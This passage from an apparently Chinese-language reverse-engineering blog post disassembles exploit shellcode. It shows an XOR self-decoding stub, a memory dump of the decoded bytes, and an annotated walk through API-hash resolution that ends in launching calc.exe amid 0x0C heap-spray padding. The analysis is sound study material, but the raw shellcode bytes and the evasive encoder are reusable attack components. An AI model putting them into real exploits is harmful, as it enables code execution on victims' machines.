class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                        <span class="comment">; ecx=0x0</span></span><br><span class="line">....000E    B1 <span class="number">31</span>           <span class="keyword">mov</span> <span class="built_in">cl</span>,<span class="number">0x31</span>                        <span class="comment">; cl=0x31=49,异或数据(49个双字)</span></span><br><span class="line">....<span class="number">0010</span>    83C5 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x4</span>                        <span class="comment">; ebp=0x....0005+0x4=0x....0009</span></span><br><span class="line">....<span class="number">0013</span>    <span class="number">3155</span> 0F         <span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>],<span class="built_in">edx</span>     <span class="comment">; [ebp+0xf]=[0x....0018]=0xA2B74762,异或解密0x18-0xDB的代码</span></span><br><span class="line">....<span class="number">0016</span>    <span class="number">0355</span> <span class="number">62</span>         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x62</span>]</span><br><span class="line">....<span class="number">0019</span>    <span class="number">47</span>              <span class="keyword">inc</span> <span class="built_in">edi</span></span><br><span class="line">....001A    B7 A2           <span class="keyword">mov</span> <span class="number">bh</span>,<span class="number">0xA2</span></span><br><span class="line">....001C    <span class="number">94</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">esp</span></span><br><span class="line">....<span class="number">001D</span>    <span class="number">05</span> 385B646A     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0x6A645B38</span></span><br><span class="line">....<span class="number">0022</span>    B0 BE           <span class="keyword">mov</span> <span class="built_in">al</span>,<span class="number">0xBE</span></span><br><span class="line">....<span class="number">0024</span>    <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">....<span class="number">0025</span>    AA              stos <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....<span class="number">0026</span>    A6              cmps <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....<span class="number">0027</span>    cb              <span class="keyword">retf</span></span><br><span class="line">....<span class="number">0028</span>    c51a            <span class="keyword">lds</span> <span class="built_in">ebx</span>,fword <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....002A    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br><span class="line">....002B    9E              <span class="keyword">sahf</span></span><br><span class="line">....002C  - E9 D1E00A7A     <span class="keyword">jmp</span> 7E2BE102</span><br><span class="line">....<span class="number">0031</span>    <span class="number">97</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">edi</span></span><br><span class="line">....<span class="number">0032</span>    2C 3C           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0x3C</span></span><br><span class="line">....<span class="number">0034</span>    cb              <span class="keyword">retf</span></span><br><span class="line">....<span class="number">0035</span>    120B            <span class="keyword">adc</span> <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br><span class="line">....<span class="number">0037</span>  ^ <span class="number">73</span> CC           <span class="keyword">jnb</span> short ....<span class="number">0005</span></span><br><span class="line">....<span class="number">0039</span>    0F6F12          <span class="keyword">movq</span> <span class="built_in">mm2</span>,<span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....003C    4E              <span class="keyword">dec</span> <span class="built_in">esi</span></span><br><span class="line">....<span class="number">003D</span>    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....003E    BC F46F9DB1     <span class="keyword">mov</span> <span class="built_in">esp</span>,<span class="number">0xB19D6FF4</span></span><br><span class="line">....<span class="number">0043</span>    F5              <span class="keyword">cmc</span></span><br><span class="line">....<span class="number">0044</span>    A8 C0           <span class="keyword">test</span> <span class="built_in">al</span>,<span class="number">0xC0</span></span><br><span class="line">....<span class="number">0046</span>    38A7 618EEF58   <span class="keyword">cmp</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>+<span class="number">0x58EF8E61</span>],<span class="number">ah</span></span><br><span class="line">....004C    <span class="number">06</span>              <span class="keyword">push</span> <span class="built_in">es</span></span><br><span class="line">....<span class="number">004D</span>    DA33            <span class="keyword">fidiv</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br><span class="line">....004F    D254CA <span class="number">33</span>       <span class="keyword">rcl</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">ecx</span>*<span class="number">8</span>+<span class="number">0x33</span>],<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0053</span>    <span class="number">07</span>              <span class="keyword">pop</span> <span class="built_in">es</span></span><br><span class="line">....<span class="number">0054</span>    2C ED           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0xED</span></span><br><span class="line">....<span class="number">0056</span>    <span class="number">1296</span> 27B4B418   <span class="keyword">adc</span> <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x18B4B427</span>]</span><br><span class="line">....005C    e4 cc           <span class="keyword">in</span> <span class="built_in">al</span>,<span class="number">0xcc</span></span><br><span class="line">....005E    FC              <span class="keyword">cld</span></span><br><span class="line">....005F    02E9            <span class="keyword">add</span> <span class="number">ch</span>,<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0061</span>  - E9 B7B9D986     <span class="keyword">jmp</span> 8AFABA1D</span><br><span class="line">....<span class="number">0066</span>    <span class="number">49</span>              <span class="keyword">dec</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0067</span>    <span class="number">68</span> 1066E555     <span class="keyword">push</span> <span class="number">0x55E56610</span></span><br><span class="line">....006C    <span class="number">9D</span>              <span class="keyword">popfd</span></span><br><span class="line">....<span class="number">006D</span>    <span class="number">95</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">....006E    F792 194682EA   <span class="keyword">not</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>-<span class="number">0x157DB9E7</span>]</span><br><span class="line">....<span class="number">0074</span>    5A              <span class="keyword">pop</span> <span class="built_in">edx</span>                                </span><br><span class="line">....<span class="number">0075</span>    FB              <span class="keyword">sti</span></span><br><span class="line">....<span class="number">0076</span>    <span class="number">95</span>              <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line">....<span class="number">0077</span>    <span class="number">2821</span>            <span class="keyword">sub</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="number">ah</span></span><br><span class="line">....<span class="number">0079</span>    <span class="number">27</span>              <span class="keyword">daa</span></span><br><span class="line">....007A    13AB 81AC8317   <span class="keyword">adc</span> <span class="built_in">ebp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="number">0x1783AC81</span>]</span><br><span class="line">....<span class="number">0080</span>    <span class="number">3060</span> <span class="number">55</span>         <span class="keyword">xor</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x55</span>],<span class="number">ah</span></span><br><span class="line">....<span class="number">0083</span>    D33E            <span class="keyword">sar</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">cl</span></span><br><span class="line">....<span class="number">0085</span>    CD <span class="number">11</span>           <span class="keyword">int</span> <span class="number">0x11</span></span><br><span class="line">....<span class="number">0087</span>    BB 22D0F6B7     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0xB7F6D022</span></span><br><span class="line">....008C    5E              <span class="keyword">pop</span> <span class="built_in">esi</span>                              </span><br><span class="line">....<span class="number">008D</span>    <span class="number">59</span>              <span class="keyword">pop</span> <span class="built_in">ecx</span>                             </span><br><span class="line">....008E    F9              <span class="keyword">stc</span></span><br><span class="line">....008F    <span class="number">17</span>              <span class="keyword">pop</span> <span class="built_in">ss</span></span><br><span class="line">....<span class="number">0090</span>    D7              <span class="keyword">xlat</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">al</span>]</span><br><span class="line">....<span class="number">0091</span>    19DE            <span class="keyword">sbb</span> <span class="built_in">esi</span>,<span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0093</span>    B3 BC           <span class="keyword">mov</span> <span class="built_in">bl</span>,<span class="number">0xBC</span></span><br><span class="line">....<span class="number">0095</span>    FA              <span class="keyword">cli</span></span><br><span class="line">....<span class="number">0096</span>  ^ 7F E5           <span class="keyword">jg</span> short ....<span class="number">007D</span></span><br><span class="line">....<span class="number">0098</span>    18AC80 F5C31125 <span class="keyword">sbb</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">4</span>+<span class="number">0x2511C3F5</span>],c&gt;</span><br><span class="line">....009F  ^ <span class="number">7D</span> E9           <span class="keyword">jge</span> short ....008A</span><br><span class="line">....00A1    <span class="number">46</span>              <span class="keyword">inc</span> <span class="built_in">esi</span></span><br><span class="line">....00A2    <span class="number">54</span>              <span class="keyword">push</span> <span class="built_in">esp</span></span><br><span class="line">....00A3    DC67 <span class="number">98</span>         <span class="keyword">fsub</span> <span class="built_in">qword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>-<span class="number">0x68</span>]</span><br><span class="line">....00A6    ea 5ac59af4 <span class="number">647</span>&gt;<span class="keyword">jmp</span> <span class="built_in">far</span> <span class="number">7964</span>:0f49ac55a</span><br><span class="line">....00AD    f3              <span class="keyword">rep</span></span><br><span class="line">....00AE    c5              <span class="built_in">db</span> c5</span><br><span class="line">....00AF    ef              <span class="keyword">out</span> <span class="built_in">dx</span>,<span class="built_in">eax</span></span><br><span class="line">....00B0    <span class="number">16</span>              <span class="keyword">push</span> <span class="built_in">ss</span></span><br><span class="line">....00B1    84D9            <span class="keyword">test</span> <span class="built_in">cl</span>,<span class="built_in">bl</span></span><br><span class="line">....00B3    <span class="number">25</span> 537A9064     <span class="keyword">and</span> <span class="built_in">eax</span>,<span class="number">0x64907A53</span></span><br><span class="line">....00B8    F5              <span class="keyword">cmc</span></span><br><span class="line">....00B9    <span class="number">137D</span> FD         <span class="keyword">adc</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3</span>]</span><br><span class="line">....00BC    <span class="number">44</span>              <span class="keyword">inc</span> <span class="built_in">esp</span></span><br><span class="line">....00BD    7E 7E           <span class="keyword">jle</span> short ....<span class="number">013D</span></span><br><span class="line">....00BF    2B8A 87FDDE72   <span class="keyword">sub</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x72DEFD87</span>]</span><br><span class="line">....00C5    7C <span class="number">1D</span>           <span class="keyword">jl</span> short ....00E4</span><br><span class="line">....00C7    AB              stos <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br><span class="line">....00C8    <span class="number">77</span> <span class="number">38</span>           <span class="keyword">ja</span> short ....<span class="number">0102</span></span><br><span class="line">....00CA    <span class="number">99</span>              <span class="keyword">cdq</span></span><br><span class="line">....00CB    <span class="number">47</span>              <span class="keyword">inc</span> <span class="built_in">edi</span></span><br><span class="line">....00CC    <span class="number">05</span> 514C68BA     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0xBA684C51</span></span><br><span class="line">....00D1    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....00D2    <span class="number">45</span>              <span class="keyword">inc</span> <span class="built_in">ebp</span></span><br><span class="line">....00D3    0B5D C1         <span class="keyword">or</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3F</span>]</span><br><span class="line">....00D6    <span class="number">05</span> E2F861AF     <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="number">0xAF61F8E2</span></span><br><span class="line">....00<span class="built_in">DB</span>    FA              <span class="keyword">cli</span></span><br><span class="line">....00DC    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00DE    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E0    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E2    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E4    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E6    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br></pre></td></tr></table></figure></p><p><strong><code>解码后：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存：</span></span><br><span class="line"><span class="comment">;....0000  BA 6D A5 42 5E DD C4 D9 74 24 F4 5D 31 C9 B1 31  簃^菽賢$鬩1杀1</span></span><br><span class="line"><span class="comment">;....0010  83 C5 04 31 55 0F 03 55 0F E2 F5 FC E8 82 00 00  兣1UU怩?.</span></span><br><span class="line"><span class="comment">;....0020  00 60 89 E5 31 C0 64 8B 50 30 8B 52 0C 8B 52 14  .`夊1纃婸0婻.婻</span></span><br><span class="line"><span class="comment">;....0030  8B 72 28 0F B7 4A 26 31 FF AC 3C 61 7C 02 2C 20  媟(稪&amp;1?a|,</span></span><br><span class="line"><span class="comment">;....0040  C1 CF 0D 01 C7 E2 F2 52 57 8B 52 10 8B 4A 3C 8B  料.氢騌W婻婮&lt;</span></span><br><span class="line"><span class="comment">;....0050  4C 11 78 E3 48 01 D1 51 8B 59 20 01 D3 8B 49 18  Lx鉎裃媃 計I</span></span><br><span class="line"><span class="comment">;....0060  E3 3A 49 8B 34 8B 01 D6 31 FF AC C1 CF 0D 01 C7  ?I????</span></span><br><span class="line"><span class="comment">;....0070  38 E0 75 F6 03 7D F8 3B 7D 24 75 E4 58 8B 58 24  8鄒?&#125;?&#125;$u鋁媂$</span></span><br><span class="line"><span class="comment">;....0080  01 D3 66 8B 0C 4B 8B 58 1C 01 D3 8B 04 8B 01 D0  觙?K媂計?</span></span><br><span class="line"><span class="comment">;....0090  89 44 24 24 5B 5B 61 59 5A 51 FF E0 5F 5F 5A 8B  塂$$[[aYZQ郷_Z</span></span><br><span class="line"><span class="comment">;....00A0  12 EB 8D 5D 6A 01 8D 85 B2 00 00 00 50 68 31 8B  雿]j崊?..Ph1</span></span><br><span class="line"><span class="comment">;....00B0  6F 87 FF D5 BB F0 B5 A2 56 68 A6 95 BD 9D FF D5  o?栈鸬h綕</span></span><br><span class="line"><span class="comment">;....00C0  3C 06 7C 0A 80 FB E0 75 05 BB 47 13 72 6F 6A 00  &lt;|.€u籊roj.</span></span><br><span class="line"><span class="comment">;....00D0  53 FF D5 63 61 6C 63 2E 65 78 65 00 0C 0C 0C 0C  S誧alc.exe.....</span></span><br><span class="line"><span class="comment">;....00E0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"><span class="comment">;....00F0  0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ................</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 反汇编：</span></span><br><span class="line">....<span class="number">0000</span>    BA 6DA5425E     <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">0x5E42A56D</span>                          <span class="comment">; edx=0x5E42A56D,异或数</span></span><br><span class="line">....<span class="number">0005</span>    DDC4            <span class="keyword">ffree</span> <span class="built_in">st</span>(<span class="number">4</span>)                                 <span class="comment">;</span></span><br><span class="line">....<span class="number">0007</span>    D97424 F4       <span class="keyword">fstenv</span> (<span class="number">28</span>-<span class="built_in">byte</span>) <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>-<span class="number">0xC</span>]           <span class="comment">; 保存FPU环境,0x0C0C0D3C-0x0C0C0D58</span></span><br><span class="line">....<span class="number">000B</span>    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                                     <span class="comment">; ebp=0x....0005</span></span><br><span class="line">....000C    31C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                 <span class="comment">; ecx=0x0</span></span><br><span class="line">....000E    B1 <span class="number">31</span>           <span class="keyword">mov</span> <span class="built_in">cl</span>,<span class="number">0x31</span>                                 <span class="comment">; cl=0x31=49,49个双字待异或解密数据</span></span><br><span class="line">....<span class="number">0010</span>    83C5 <span class="number">04</span>         <span class="keyword">add</span> <span class="built_in">ebp</span>,<span class="number">0x4</span>                                 <span class="comment">; ebp=0x....0005+0x4=0x....0009</span></span><br><span class="line">....<span class="number">0013</span>    <span class="number">3155</span> 0F         <span class="keyword">xor</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>],<span class="built_in">edx</span>              <span class="comment">; [ebp+0xf]=[0x....0018]=0xA2B74762,异或解密0x18-0xDB的代码</span></span><br><span class="line">....<span class="number">0016</span>    <span class="number">0355</span> 0F         <span class="keyword">add</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xF</span>]              <span class="comment">; edx=edx+[ebp+0xf]=0x5E42A56D+0xFCF5E20F=0x5B38877C</span></span><br><span class="line">....<span class="number">0019</span>  ^ E2 F5           loopd short ....<span class="number">0010</span>                        <span class="comment">; 跳转到0x....0010,ecx=ecx-1</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....<span class="number">001B</span>    FC              <span class="keyword">cld</span>                                         <span class="comment">; 方向标志位DF清零,lodsb指令根据DF改变esi</span></span><br><span class="line">....001C    E8 <span class="number">82000000</span>     <span class="keyword">call</span> ....00A3                               <span class="comment">; 返回地址为0x....0021</span></span><br><span class="line">....<span class="number">0021</span>    <span class="number">60</span>              <span class="keyword">pushad</span></span><br><span class="line">....<span class="number">0022</span>    89E5            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></span><br><span class="line">....<span class="number">0024</span>    31C0            <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">....<span class="number">0026</span>    <span class="number">64</span>:8B50 <span class="number">30</span>      <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="built_in">eax</span>+<span class="number">0x30</span>]</span><br><span class="line">....002A    8B52 0C         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0xC</span>]</span><br><span class="line">....<span class="number">002D</span>    8B52 <span class="number">14</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x14</span>]</span><br><span class="line">....<span class="number">0030</span>    8B72 <span class="number">28</span>         <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x28</span>]</span><br><span class="line">....<span class="number">0033</span>    0FB74A <span class="number">26</span>       <span class="keyword">movzx</span> <span class="built_in">ecx</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x26</span>]</span><br><span class="line">....<span class="number">0037</span>    31FF            <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>                   ---+</span><br><span class="line">....<span class="number">0039</span>    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]           |</span><br><span class="line">....003A    3C <span class="number">61</span>           <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">0x61</span>                      |</span><br><span class="line">....003C    7C <span class="number">02</span>           <span class="keyword">jl</span> short ....<span class="number">0040</span>                | 计算dll名称hash</span><br><span class="line">....003E    2C <span class="number">20</span>           <span class="keyword">sub</span> <span class="built_in">al</span>,<span class="number">0x20</span>                      |</span><br><span class="line">....<span class="number">0040</span>    C1CF <span class="number">0D</span>         <span class="keyword">ror</span> <span class="built_in">edi</span>,<span class="number">0xD</span>                      |</span><br><span class="line">....<span class="number">0043</span>    01C7            <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                      |</span><br><span class="line">....<span class="number">0045</span>  ^ E2 F2           loopd short ....<span class="number">0039</span>          ---+</span><br><span class="line">....<span class="number">0047</span>    <span class="number">52</span>              <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line">....<span class="number">0048</span>    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line">....<span class="number">0049</span>    8B52 <span class="number">10</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x10</span>]</span><br><span class="line">....004C    8B4A 3C         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="number">0x3C</span>]</span><br><span class="line">....004F    8B4C11 <span class="number">78</span>       <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="built_in">edx</span>+<span class="number">0x78</span>]</span><br><span class="line">....<span class="number">0053</span>    E3 <span class="number">48</span>           <span class="keyword">jecxz</span> short ....<span class="number">009D</span></span><br><span class="line">....<span class="number">0055</span>    01D1            <span class="keyword">add</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0057</span>    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0058</span>    8B59 <span class="number">20</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x20</span>]</span><br><span class="line">....005B    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">005D</span>    8B49 <span class="number">18</span>         <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x18</span>]</span><br><span class="line">....<span class="number">0060</span>    E3 3A           <span class="keyword">jecxz</span> short ....009C</span><br><span class="line">....<span class="number">0062</span>    <span class="number">49</span>              <span class="keyword">dec</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0063</span>    8B348B          <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]</span><br><span class="line">....<span class="number">0066</span>    01D6            <span class="keyword">add</span> <span class="built_in">esi</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0068</span>    31FF            <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>                  ---+</span><br><span class="line">....006A    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]          |</span><br><span class="line">....006B    C1CF <span class="number">0D</span>         <span class="keyword">ror</span> <span class="built_in">edi</span>,<span class="number">0xD</span>                     |</span><br><span class="line">....006E    01C7            <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                     | 计算函数名hash</span><br><span class="line">....<span class="number">0070</span>    38E0            <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">ah</span>                       |</span><br><span class="line">....<span class="number">0072</span>  ^ <span class="number">75</span> F6           <span class="keyword">jnz</span> short ....006A           ---+    </span><br><span class="line">....<span class="number">0074</span>    <span class="number">037D</span> F8         <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]  | api_hash = dll_name_hash + func_name_hash</span><br><span class="line">....<span class="number">0077</span>    3B7D <span class="number">24</span>         <span class="keyword">cmp</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x24</span>] |</span><br><span class="line">....007A  ^ <span class="number">75</span> E4           <span class="keyword">jnz</span> short ....<span class="number">0060</span>           ---+</span><br><span class="line">....007C    <span class="number">58</span>              <span class="keyword">pop</span> <span class="built_in">eax</span></span><br><span class="line">....<span class="number">007D</span>    8B58 <span class="number">24</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x24</span>]</span><br><span class="line">....<span class="number">0080</span>    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0082</span>    <span class="number">66</span>:8B0C4B       <span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span 